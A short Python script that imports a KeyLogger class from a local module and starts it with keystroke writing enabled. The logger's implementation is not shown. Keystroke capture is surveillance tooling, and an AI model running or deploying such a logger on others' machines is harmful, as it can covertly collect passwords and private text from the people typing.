from logger.keyboard import KeyLogger

if __name__ == "__main__":
    key_log = KeyLogger(write=True, keys_to_save=2)
    key_log.run()
